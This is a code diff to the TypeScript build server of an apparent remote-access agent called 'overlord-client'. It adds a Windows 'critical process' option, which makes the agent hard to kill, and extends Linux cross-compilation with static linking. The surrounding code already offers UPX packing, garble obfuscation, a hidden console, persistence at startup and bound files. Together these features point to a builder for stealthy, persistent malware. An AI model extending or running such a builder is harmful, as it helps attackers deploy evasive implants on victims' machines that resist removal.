@@ -87,6 +87,7 @@ type BuildProcessConfig = {
   enableUpx?: boolean;
   upxStripHeaders?: boolean;
   requireAdmin?: boolean;
+  criticalProcess?: boolean;
   outputExtension?: string;
   sleepSeconds?: number;
   boundFiles?: BoundFile[];
@@ -641,7 +642,9 @@ func runBoundFiles() {
 
       if (env.CGO_ENABLED === "1") {
         const cCompilerByTarget: Record<string, string> = {
-          "linux/amd64": "gcc",
+          "linux/amd64": "musl-gcc",
+          "linux/arm64": "aarch64-linux-gnu-gcc",
+          "linux/arm/v7": "arm-linux-gnueabihf-gcc",
           "windows/amd64": "x86_64-w64-mingw32-gcc",
           "windows/386": "i686-w64-mingw32-gcc",
           ...(ndkBin ? {
@@ -652,6 +655,8 @@ func runBoundFiles() {
         };
         const cxxCompilerByTarget: Record<string, string> = {
           "linux/amd64": "g++",
+          "linux/arm64": "aarch64-linux-gnu-g++",
+          "linux/arm/v7": "arm-linux-gnueabihf-g++",
           "windows/amd64": "x86_64-w64-mingw32-g++",
           "windows/386": "i686-w64-mingw32-g++",
           ...(ndkBin ? {
@@ -708,7 +713,7 @@ func runBoundFiles() {
             ? config.persistenceMethods
             : ['startup'];
           sendToStream({ type: "output", text: `Persistence enabled for ${platform} (methods: ${activeMethods.join(', ')})\n`, level: "info" });
-          if (os === 'windows' && config.startupName) {
+          if (config.startupName) {
             const startupNameFlag = `-X overlord-client/cmd/agent/persistence.DefaultStartupName=${config.startupName}`;
             ldflags = `${ldflags} ${startupNameFlag}`;
             sendToStream({ type: "output", text: `Startup name: ${config.startupName}\n`, level: "info" });
@@ -740,6 +745,12 @@ func runBoundFiles() {
         sendToStream({ type: "output", text: "Windows console hidden (GUI subsystem)\n", level: "info" });
       }
 
+      if (config.criticalProcess && os === "windows") {
+        const criticalFlag = "-X overlord-client/cmd/agent/config.DefaultCriticalProcess=true";
+        ldflags = ldflags ? `${ldflags} ${criticalFlag}` : criticalFlag;
+        sendToStream({ type: "output", text: "Critical process: enabled (requires admin at runtime)\n", level: "info" });
+      }
+
       if (config.obfuscate) {
         sendToStream({ type: "output", text: "Obfuscation enabled (garble)\n", level: "info" });
         if (config.garbleLiterals) {
@@ -755,6 +766,14 @@ func runBoundFiles() {
 
       if (config.noPrinting) {
         sendToStream({ type: "output", text: "Client printing disabled (noprint tag)\n", level: "info" });
+      }
+
+      // Linux CGO builds must be fully statically linked to avoid glibc version
+      // mismatches between the build server and target machines.
+      if (os === "linux" && env.CGO_ENABLED === "1") {
+        const staticFlag = "-extldflags '-static'";
+        ldflags = ldflags ? `${ldflags} ${staticFlag}` : staticFlag;
+        sendToStream({ type: "output", text: "Linux CGO: static linking enabled (avoids GLIBC version mismatch)\n", level: "info" });
       }
 
       try {
